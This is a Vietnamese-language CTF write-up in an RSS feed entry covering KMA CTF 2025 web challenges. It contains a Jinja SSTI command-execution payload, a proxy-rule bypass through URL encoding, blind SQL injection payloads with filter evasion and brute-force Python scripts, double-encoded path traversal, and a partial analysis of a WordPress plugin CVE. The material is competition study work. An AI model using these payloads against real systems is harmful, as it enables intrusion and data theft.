@@ -1,0 +1,449 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Duc193</title><description>Blog</description><link>https://derive206.github.io/</link><language>en</language><item><title>Writeup KMA CTF 2025</title><link>https://derive206.github.io/posts/writeup_kma_ctf/</link><guid isPermaLink="true">https://derive206.github.io/posts/writeup_kma_ctf/</guid><pubDate>Mon, 29 Sep 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;KMA CTF :&lt;/h1&gt;
+&lt;p&gt;Writeup KMA CTF:
+&lt;img src=&quot;https://hackmd.io/_uploads/SyidL_vhel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;YDSYD :&lt;/h2&gt;
+&lt;p&gt;Bài này server cho user &lt;code&gt;admin&lt;/code&gt; có &lt;code&gt;isAdmin : true&lt;/code&gt; sẵn rồi.
+Ở endpoint &lt;code&gt;/login&lt;/code&gt; ko có sự filter nào về user &lt;code&gt;admin&lt;/code&gt;
+&lt;img src=&quot;https://hackmd.io/_uploads/S1maaI82xx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Vậy chỉ cần login vào với user là &lt;code&gt;admin&lt;/code&gt; là đã có token JWT và get flag thôi.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /login HTTP/2
+Host: ydsyd.wargame.vn
+Content-Type: application/json
+Content-Length: 16
+
+{&quot;user&quot;:&quot;admin&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJHa0U8ngg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Và chỉ cần gắn cookie vào, POST tới &lt;code&gt;annyeong&lt;/code&gt; là đã được flag :
+&lt;img src=&quot;https://hackmd.io/_uploads/BkSZJP8nle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /annyeong HTTP/2
+Host: ydsyd.wargame.vn
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlLCJpYXQiOjE3NTkwNDMyMzAsImV4cCI6MTc1OTA0NjgzMH0.9Aeue-p_znn_7PGm7SOoPDqm1Ryq5Ds2z86GF-UtqJI
+Content-Type: application/json
+Content-Length: 2
+
+{}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/r1e7yPU3eg.png&quot; alt=&quot;image&quot; /&gt;
+FLAG : &lt;code&gt;KMACTF{Y1u__50lv3d_Y0u_L1ved??&amp;lt;3}&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;ACL and H1 :&lt;/h2&gt;
+&lt;p&gt;Challenge này có vuln SSTI ở &lt;code&gt;/render&lt;/code&gt;
+&lt;img src=&quot;https://hackmd.io/_uploads/rkWsJDL2xg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Nhận &lt;code&gt;filepath&lt;/code&gt; sau đó sẽ read file và &lt;code&gt;render_template_string&lt;/code&gt; với nội dung file.
+Và cho chúng ta upload file, nó sẽ random name sau đó save vào &lt;code&gt;uploads&lt;/code&gt;
+&lt;img src=&quot;https://hackmd.io/_uploads/B1SklPIhgg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Hàm &lt;code&gt;allow_file&lt;/code&gt; sẽ check file coi có phải là &lt;code&gt;txt&lt;/code&gt; hoặc &lt;code&gt;html&lt;/code&gt; hay không.
+&lt;img src=&quot;https://hackmd.io/_uploads/Hy6Xgv8hlx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Và challenge này sử dụng &lt;code&gt;gunicorn&lt;/code&gt; làm sv proxy.
+config :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;map /render http://gunicorn-server:8088/internal @action=deny @method=post @method=get
+map / http://gunicorn-server:8088/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Thì nó sẽ chặn rq tới &lt;code&gt;/render&lt;/code&gt; &lt;code&gt;http://gunicorn-server:8088/internal&lt;/code&gt; với method post hoặc get.&lt;/p&gt;
+&lt;p&gt;Thì &lt;code&gt;/render&lt;/code&gt; chính là chỗ chúng ta cần truy cập để trigger &lt;code&gt;SSTI&lt;/code&gt;
+Thì gunicorn có CVE&lt;code&gt; Http Requests Smuggling&lt;/code&gt; nhưng ở biên bản thấp hơn, mà author sử dụng &lt;code&gt;gunicorn==23.0.0&lt;/code&gt; nên phải tìm cách bypass khác.&lt;/p&gt;
+&lt;p&gt;Để ý thì author dùng &lt;code&gt;map /render&lt;/code&gt; Vậy sẽ ra sao khi chúng ta encode endpoint đó và gửi lên sv.
+Khi gửi rq bình thường :
+&lt;img src=&quot;https://hackmd.io/_uploads/BJRlGwUngx.png&quot; alt=&quot;image&quot; /&gt;
+Encode :
+&lt;img src=&quot;https://hackmd.io/_uploads/r1OdfD8hxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Vậy là đã truy cập được , bây giờ upload file chứa payload SSTI RCE để get flag thôi :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{{ self.__init__.__globals__.__builtins__.__import__(&apos;os&apos;).popen(&apos;cat /*&apos;).read() }}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Sau khi upload thì đã được path :
+&lt;img src=&quot;https://hackmd.io/_uploads/Hk57QwUhxl.png&quot; alt=&quot;image&quot; /&gt;
+See all file :
+&lt;img src=&quot;https://hackmd.io/_uploads/BkTrXDInee.png&quot; alt=&quot;image&quot; /&gt;
+Render + url encoding :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJpvQwL2xe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Flag : &lt;code&gt;KMACTF{HTTP/1.1_Must_Di3_or_Not?????}&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;vibe_coding :&lt;/h2&gt;
+&lt;p&gt;Challenge này có 2 service là &lt;code&gt;nodejs&lt;/code&gt; và &lt;code&gt;python&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Service &lt;code&gt;python&lt;/code&gt; chứa flag và được return khi call &lt;code&gt;process_action&lt;/code&gt; với &lt;code&gt;username&lt;/code&gt; là &lt;code&gt;admin&lt;/code&gt; và &lt;code&gt;action&lt;/code&gt; là &lt;code&gt;readFlag&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/H1OnND8nle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Ở endpoint &lt;code&gt;/execute&lt;/code&gt; (Đã rút gọn code) Thì sẽ nhận POST tới và get &lt;code&gt;username&lt;/code&gt;,&lt;code&gt;request_id &lt;/code&gt;,&lt;code&gt;action&lt;/code&gt; từ &lt;code&gt;request.form.get(&apos;...&apos;).strip()&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;@app.route(&apos;/execute&apos;, methods=[&apos;POST&apos;])
+def execute_handler():
+    try:
+        username = request.form.get(&apos;username&apos;, &apos;&apos;).strip()
+        request_id = request.form.get(&apos;requestid&apos;, &apos;&apos;).strip()
+        action = request.form.get(&apos;action&apos;, &apos;&apos;).strip()
+        
+        if not username or not request_id or not action:
+            return send_error_response(
+                &quot;Missing required fields&quot;,
+                &quot;username, requestid, and action are required&quot;,
+                400
+            )
+        
+            ...    
+        
+        return jsonify(response), 200
+        
+    except Exception as e:
+            ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;hàm &lt;code&gt;.strip()&lt;/code&gt; sẽ xoá space ở đầu và ở cuối của &lt;code&gt;variable&lt;/code&gt;.
+Service python chỉ cho phép local, ko mở port ra bên ngoài.
+&lt;img src=&quot;https://hackmd.io/_uploads/r1dWUvU3lg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Service &lt;code&gt;nodejs&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;app.post(&apos;/register&apos;, async (req, res) =&amp;gt; {
+    const { username, password } = req.body;
+
+    if (!username || !password) {
+        return res.status(400).json({
+            error: &apos;Username and password are required&apos;
+        });
+    }
+
+    if( typeof username !== &apos;string&apos; || typeof password !== &apos;string&apos; ) {
+        return res.status(400).json({
+            error: &apos;Username and password must be strings&apos;
+        });
+    }
+
+    // Validate username length (must be &amp;gt; 5 characters)
+    if (username.length &amp;lt;= 5) {
+        return res.status(400).json({
+            error: &apos;Username must be longer than 5 characters&apos;
+        });
+    }
+
+    if (users[username]) {
+        return res.status(400).json({
+            error: &apos;User already exists&apos;
+        });
+    }
+
+    try {
+        const hashedPassword = await bcrypt.hash(password, 10);
+        users[username] = {
+            username,
+            password: hashedPassword,
+            createdAt: new Date().toISOString()
+        };
+
+        res.json({
+            message: &apos;User registered successfully&apos;,
+            username: username,
+            hint: &apos;Now you can login to get JWT token&apos;
+        });
+    } catch (error) {
+        res.status(500).json({
+            error: &apos;Registration failed&apos;,
+            message: error.message
+        });
+    }
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Endpoint này cho register, check &lt;code&gt;users[username]&lt;/code&gt; xem nếu có báo user đã tồn tại hoặc lỗi thì return &lt;code&gt;failed&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Còn &lt;code&gt;/action&lt;/code&gt; sẽ get data từ requests của user. Sau đó sẽ gửi về server python &lt;code&gt;/execute&lt;/code&gt; :
+&lt;img src=&quot;https://hackmd.io/_uploads/S1U7FcL2gl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Để ý thì &lt;code&gt;register, login&lt;/code&gt; sẽ ở bên service nodejs. Còn khi action qua service của python thì nó sẽ nhận data và &lt;code&gt;.strip()&lt;/code&gt;
+&lt;img src=&quot;https://hackmd.io/_uploads/BkkjY58hll.png&quot; alt=&quot;image&quot; /&gt;
+Ý tưởng :&lt;/p&gt;
+&lt;p&gt;Chúng ta có thể lợi dụng điều này để reg username &lt;code&gt; admin       &lt;/code&gt; (có space ở 2 đầu) để register và login.
+Sau đó khi server &lt;code&gt;nodejs&lt;/code&gt; forward qua server &lt;code&gt;python&lt;/code&gt; thì sẽ strip và chúng ta đã được user là &lt;code&gt;admin&lt;/code&gt; trong requests tới &lt;code&gt;/execute&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Register :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /register HTTP/1.1
+Host: 165.22.55.200:50004
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 43
+
+{&quot;username&quot;:&quot;  admin &quot;,&quot;password&quot;:&quot;duc193&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Hkpgj583ll.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Login :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /login HTTP/1.1
+Host: 165.22.55.200:50004
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 43
+
+{&quot;username&quot;:&quot;  admin &quot;,&quot;password&quot;:&quot;duc193&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ryo-o9Lhgl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Get flag :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /action HTTP/1.1
+Host: 165.22.55.200:50004
+Connection: keep-alive
+Content-Type: application/json
+Authorization: Beaber eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IiAgYWRtaW4gIiwiaWF0IjoxNzU5MDU4NjgxLCJleHAiOjE3NTkxNDUwODF9.YlixecXi8vByAOr-xZSGv7b1uXQD7lPldoGwvQRFHaM
+Content-Length: 21
+
+{&quot;action&quot;:&quot;readFlag&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/S1TPi5Ihll.png&quot; alt=&quot;image&quot; /&gt;
+flag : &lt;code&gt;KMACTF{how_can_you_pollute_param_@@_}&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;Data Lost Prevention :&lt;/h2&gt;
+&lt;p&gt;Challenge này cho chúng ta 1 trang web như sau :
+&lt;img src=&quot;https://hackmd.io/_uploads/B1mpjqU2xx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Để ý vào chức năng &lt;code&gt;search&lt;/code&gt; và chức năng &lt;code&gt;export&lt;/code&gt;.
+Đầu tiên thì phải xác định flag nằm ở đâu đã :
+&lt;img src=&quot;https://hackmd.io/_uploads/ryO-h5I3lx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Thì đoạn code này sẽ check coi trong &lt;code&gt;attachments&lt;/code&gt; có &lt;code&gt;is_lost=1&lt;/code&gt; trong db chưa, có r thì out. Chưa có thì sẽ gen &lt;code&gt;uuidv4&lt;/code&gt; rename file flag và gắn vào path &lt;code&gt;/var/data/flags&lt;/code&gt;.
+Sau đó sẽ add vào table &lt;code&gt;attachments&lt;/code&gt; với &lt;code&gt;filename&lt;/code&gt; là &lt;code&gt;Q2-incident-raw.csv&lt;/code&gt; và &lt;code&gt;storage_path&lt;/code&gt; là path tới file flag vừa gen.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/api/search.php&lt;/code&gt; :
+&lt;img src=&quot;https://hackmd.io/_uploads/BJMOp58nll.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Đoạn này có dính vuln SQL Injection do chèn &lt;code&gt;$filtered&lt;/code&gt; vào payload sql. Dù đã qua filter nhưng vẫn k an toàn.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;$q2 = preg_replace(&apos;/\s+/u&apos;, &apos;&apos;, $q);&lt;/code&gt; đoạn này sẽ filter và replace các khoảng trắng. Bao gồm &lt;code&gt;space,tab,\n,...&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;$q2 = preg_replace(&apos;/\b(?:or|and)\b/i&apos;, &apos;&apos;, $q2);&lt;/code&gt; dòng này sẽ replace &lt;code&gt;or&lt;/code&gt; và &lt;code&gt;and&lt;/code&gt; (không phân biệt viết hoa hay thường.). Lưu ý là do có &lt;code&gt;\b&lt;/code&gt; nên là chỉ có &lt;code&gt;or&lt;/code&gt; hoặc &lt;code&gt;and&lt;/code&gt; đứng một mình mới bị replace. Nên là ko thể bypass bằng cách dùng &lt;code&gt;oorr&lt;/code&gt; hay &lt;code&gt;anandd&lt;/code&gt;. Nhưng mà có thể dùng &lt;code&gt;||&lt;/code&gt;,&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; thay cho &lt;code&gt;or&lt;/code&gt; và &lt;code&gt;and&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;$q2 = str_ireplace([&quot;union&quot;,&quot;load_file&quot;,&quot;outfile&quot;,&quot;=&quot;], &apos;&apos;, $q2);&lt;/code&gt; Hàm này chỉ đơn giảnn là replace các kí tự nếu có trong chuỗi (Ko phân biệt Hoa, thường).
+Và lưu ý là chuỗi sau khi replace xong sẽ được check &lt;code&gt;strlen&lt;/code&gt; dưới 90 kí tự mới cho phép query&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Đây là payload gốc :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$sql = &quot;SELECT id,title FROM cases WHERE title RLIKE &apos;.*$filtered&apos; AND owner_id = :uid LIMIT 1&quot;;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Thì chỉ trả về json &lt;code&gt;(bool)$row&lt;/code&gt; nên chúng ta cần query blind boolean để trả về row hoặc ko.
+Vậy cần payload ngắn mà đáp ứng được điều kiện trên :
+Sau một hồi fuzz thử thì được payload như sau :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rk-Sbi8nex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;payload :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;-&apos;union select 1,1 FROM(attachments)where substr(storage_path,1,1)like&apos;/&apos;#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;(&lt;code&gt;-&apos;&lt;/code&gt; để làm cho nó return sai vế trước.)
+Sau đó dùng union để select 2 row và get &lt;code&gt;storage_path&lt;/code&gt; từ &lt;code&gt;attachments&lt;/code&gt;, sau đó substring để bruteforce từng kí tự.&lt;/p&gt;
+&lt;p&gt;Bypass filter :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Vì union bị filter nên có thể chèn &lt;code&gt;unio=n&lt;/code&gt; để khi nó replace &lt;code&gt;=&lt;/code&gt; sẽ còn chuỗi &lt;code&gt;union&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Bypass filter space bằng &lt;code&gt;/**/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Đoạn &lt;code&gt;FROM(attachments)&lt;/code&gt; thì dùng cách này để khỏi phải dùng &lt;code&gt;/**/FROM/**/attachments/**/&lt;/code&gt; để payload ngắn hơn.&lt;/li&gt;
+&lt;li&gt;Đoạn &lt;code&gt;substring(storage_path,1,1)like&apos;/&apos;#&lt;/code&gt; viết liền để hạn chế dùng space (Nhưng mà nó vẫn chạy được.)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Thay &lt;code&gt;/**/&lt;/code&gt; vào payload :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;-&apos;union/**/select/**/1,1/**/FROM(attachments)where/**/substr(storage_path,1,1)like&apos;/&apos;#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Được payload 86 kí tự, hợp lí rồi.
+Script Brute tên file :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+base_url = &quot;https://dlp.wargame.vn/api/search.php?q=&quot;
+cookies = {&quot;PHPSESSID&quot;: &quot;d005006fea64b1d184298adaaf03502e&quot;}
+headers = {&quot;Connection&quot;: &quot;keep-alive&quot;}
+file = &quot;/var/data/flags/flag_2986112&quot;
+# Cho _ ở cuối bởi vì chúng ta dùng LIKE nó sẽ luôn true khi có _ (Có thể dùng để check length)
+# Nhưng mà do name flag không có `_` nên là thôi bỏ cũng được.
+CHARSET = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/.-{}_&quot;
+def gen_payload(index,ch):
+    sql  = f&quot;-&apos;uni%3don%2f**%2fselect%2f**%2f1%2c1%2f**%2fFROM(attachments)where%2f**%2fsubstr(storage_path%2c{index}%2c1)like&apos;{ch}&apos;%23&quot;
+    return sql
+for i in range(27,100):
+    for ch in CHARSET:
+        payload = gen_payload(i,ch)
+        url = base_url + payload
+        a = requests.get(url)
+        if &quot;true&quot; in a.text:
+            file += ch
+            break
+    print(file)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Do trên server hơi lag nên GPT để script đa luồng cho nhanh :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import threading
+import time
+
+base_url = &quot;https://dlp.wargame.vn/api/search.php?q=&quot;
+cookies = {&quot;PHPSESSID&quot;: &quot;d005006fea64b1d184298adaaf03502e&quot;}
+headers = {&quot;Connection&quot;: &quot;keep-alive&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (ctf-bruter)&quot;}
+CHARSET = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/.-{}&quot;
+
+file_path = &quot;&quot;
+
+MAX_WORKERS = 10
+REQUEST_TIMEOUT = 8
+RETRY = 2
+SLEEP_BETWEEN_INDEX = 0.05
+
+def gen_payload(index, ch):
+    sql  = f&quot;-&apos;uni%3don%2f**%2fselect%2f**%2f1%2c1%2f**%2fFROM(attachments)where%2f**%2fsubstr(storage_path%2c{index}%2c1)like&apos;{ch}&apos;%23&quot;
+    return sql
+
+def probe_char(session: requests.Session, index: int, ch: str) -&amp;gt; bool:
+    url = base_url + gen_payload(index, ch)
+    tries = 0
+    while tries &amp;lt;= RETRY:
+        try:
+            r = session.get(url, cookies=cookies, headers=headers, timeout=REQUEST_TIMEOUT, allow_redirects=False)
+            if &quot;true&quot; in r.text:
+                return True
+            return False
+        except requests.RequestException:
+            tries += 1
+            time.sleep(0.2)
+    return False
+
+def find_char_at_index(session: requests.Session, index: int) -&amp;gt; str | None:
+    found_event = threading.Event()
+    found_char = None
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        futures = {executor.submit(probe_char, session, index, ch): ch for ch in CHARSET}
+
+        try:
+            for fut in as_completed(futures):
+                ch = futures[fut]
+                try:
+                    ok = fut.result()
+                except Exception:
+                    ok = False
+                if ok:
+                    found_char = ch
+                    found_event.set()
+                    break
+        finally:
+            pass
+
+    return found_char
+
+def main():
+    global file_path
+    start = 1
+    end = 100
+
+    with requests.Session() as session:
+        for i in range(start, end):
+            ch = find_char_at_index(session, i)
+            if ch is None:
+                print(f&quot;[{i}] No char found -&amp;gt; stopping.&quot;)
+                break
+            file_path += ch
+            print(f&quot;[{i}] found: {ch} -&amp;gt; {file_path}&quot;)
+            time.sleep(SLEEP_BETWEEN_INDEX)
+
+    print(&quot;Done. Final:&quot;, file_path)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Nhớ thay cookie vào chạy chứ không bị lỗi.
+Được tên flag :
+&lt;img src=&quot;https://hackmd.io/_uploads/HybELs82gg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/var/data/flags/flag-2986112f-ec04-4d17-b80a-6a60a00a95da.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Bên &lt;code&gt;export.php&lt;/code&gt;
+&lt;img src=&quot;https://hackmd.io/_uploads/Bk5BLsInee.png&quot; alt=&quot;image&quot; /&gt;
+Thì sẽ check while nếu có &lt;code&gt;../&lt;/code&gt; sẽ replace thành &lt;code&gt;&quot;&quot;&lt;/code&gt;
+(Không thể dùng &lt;code&gt;..././&lt;/code&gt;) vì nó có đệ quy)
+Để ý thì nó có &lt;code&gt;urldecode&lt;/code&gt; nên chúng ta có thể encoding 2 lần gửi lên để bypass qua filter.
+2 lần do 1 lần server tự decode, lần thứ 2 là do code.&lt;/p&gt;
+&lt;p&gt;path traversal về :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;../../data/flags/flag-2986112f-ec04-4d17-b80a-6a60a00a95da.txt&lt;/code&gt;
+double url encode :
+&lt;code&gt;..%252f..%252fdata%252fflags%252fflag-2986112f-ec04-4d17-b80a-6a60a00a95da.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ryPgwoLnlx.png&quot; alt=&quot;image&quot; /&gt;
+Flag :
+&lt;code&gt;KMACTF{i&apos;M_bL1nd_bUt_u_&apos;r3_Sm4rZZZZ}&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;CVE-2025-93XX :&lt;/h2&gt;
+&lt;p&gt;Challenge này author cho chúng ta 1 file WordPress :
+Sau khi dựng local lên thì vào page admin.
+Thì challenge WP thường đa số sẽ target vào plugin WP. Nên là check thử Plugin trong &lt;code&gt;wp-admin&lt;/code&gt; :
+(Ở đây mình tự active 2 plugin)
+&lt;img src=&quot;https://hackmd.io/_uploads/r1Ug_sIhgl.png&quot; alt=&quot;image&quot; /&gt;
+Vậy là có 2 plugin là &lt;code&gt;Safe PHP Class Upload (read-only, non-executable)&lt;/code&gt; version &lt;code&gt;0.1&lt;/code&gt; (author &lt;code&gt;meulody&lt;/code&gt; tên author challenge này ) và &lt;code&gt;WPCasa&lt;/code&gt; version &lt;code&gt;1.4.1 &lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Khi search thử thì thấy có CVE của &lt;code&gt;wpcasa&lt;/code&gt;
+https://zeropath.com/blog/cve-2025-9321-wpcasa-wordpress-plugin-code-injection-summary&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;CVE 2025-9321&lt;/code&gt;
+Tóm tắt thì plugin &lt;code&gt;WPCasa&lt;/code&gt; có chứa lỗ hổng &lt;code&gt;Code Injection&lt;/code&gt; cho phép attacker call hàm &lt;code&gt;api_requests&lt;/code&gt; nằm ở file &lt;code&gt;includes/class-wpsight-api.php&lt;/code&gt; và có thể dẫn tới RCE. Do không &lt;code&gt;WhiteList&lt;/code&gt;, &lt;code&gt;filter blacklist&lt;/code&gt; input nên dẫn tới việc attacker có thể tấn công vào và RCE.&lt;/p&gt;
+&lt;p&gt;Vì CVE này mới ra được 6 ngày nên chưa có PoC (1day).
+&lt;img src=&quot;https://hackmd.io/_uploads/r1sTOiI3lx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Mở thử file đó lên xem như nào đã :
+Khi khởi tạo class nó sẽ chạy &lt;code&gt;__construct()&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;add_filter( &apos;query_vars&apos;, array( $this, &apos;add_query_vars&apos;), 0 );&lt;/code&gt; : thêm biến query &lt;code&gt;wpsight-api&lt;/code&gt; vào danh sách &lt;code&gt;query_vars&lt;/code&gt; của &lt;code&gt;WordPress&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;add_action( &apos;parse_request&apos;, array( $this, &apos;api_requests&apos;), 0 );&lt;/code&gt; : Hook vào quá trình parse request để xử lý khi có request tới endpoint API.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;function add_query_vars( $vars )&lt;/code&gt; : Mở rộng query vars của &lt;code&gt;WordPress&lt;/code&gt; để chấp nhận tham số &lt;code&gt;?wpsight-api=...&lt;/code&gt; trên URL.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Skhm4PPhxl.png&quot; alt=&quot;image&quot; /&gt;
+Hàm &lt;code&gt;api_requests&lt;/code&gt; sẽ có flow như sau :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Nếu tồn tại &lt;code&gt;$_GET[&apos;wpsight-api&apos;]&lt;/code&gt; → gán vào &lt;code&gt;$wp-&amp;gt;query_vars[&apos;wc-api&apos;]&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Sau đó check nếu có &lt;code&gt;$wp-&amp;gt;query_vars[&apos;wc-api&apos;]&lt;/code&gt; sẽ &lt;code&gt;ob_start()&lt;/code&gt; Hàm này sẽ không cho script nếu được chạy in ra output ra ngoài. Đây là lí do tại sao khi gọi echo nó không in ra.&lt;/li&gt;
+&lt;li&gt;Tiếp tục sẽ gắn &lt;code&gt;$api&lt;/code&gt; từ &lt;code&gt;wpsight-api&lt;/code&gt; &lt;code&gt;lowercase&lt;/code&gt;. Sau đó nếu tồn tại class thì khởi tạo class đó. với &lt;code&gt;new $api()&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkHBFj82el.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Ban đầu thì ý tưởng là tìm sink để RCE nhưng mà không được, do chỉ cho mỗi reg new Class, không cho truyền j vào.
+Sau thì nghĩ lại thấy plugin upload của author :
+&lt;img src=&quot;https://hackmd.io/_uploads/SkDZ9i83ll.png&quot; alt=&quot;image&quot; /&gt;
+Đầu tiên sẽ khởi tạo và &lt;code&gt;add_action(&apos;rest_api_init&apos;, function ()&lt;/code&gt; để nhận rq post tới.
+&lt;img src=&quot;https://hackmd.io/_uploads/HJIM5jL2ex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;flow sẽ như sau :
+Nhận file -&amp;gt; check coi nếu file có size &amp;gt; 64 byte thì throw lỗi. -&amp;gt; read file và check phải có &lt;code&gt;Class ...&lt;/code&gt; -&amp;gt; sau đó sẽ check xem chúng ta có sử dụng hàm bị cấm không.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJK09sI2lg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Rồi mới save vào file &lt;code&gt;.txt&lt;/code&gt;
+&lt;img src=&quot;https://hackmd.io/_uploads/H1gelssU3lx.png&quot; alt=&quot;image&quot; /&gt;
+Câu hỏi đặt ra là save vào file txt thì làm sao mà dùng Class này để có thể trigger CVE được.&lt;/p&gt;
+&lt;p&gt;Để tìm hiểu rõ hơn thì CTRL SHIFT F &lt;code&gt;uploads_safe_classes&lt;/code&gt;
+&lt;img src=&quot;https://hackmd.io/_uploads/Hy6rss8hgl.png&quot; alt=&quot;image&quot; /&gt;
+Và chúng ta đã tìm thấy author đã sửa đoạn code này để &lt;code&gt;include&lt;/code&gt; file txt vào.
+&lt;img src=&quot;https://hackmd.io/_uploads/Sy4ujjUhee.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
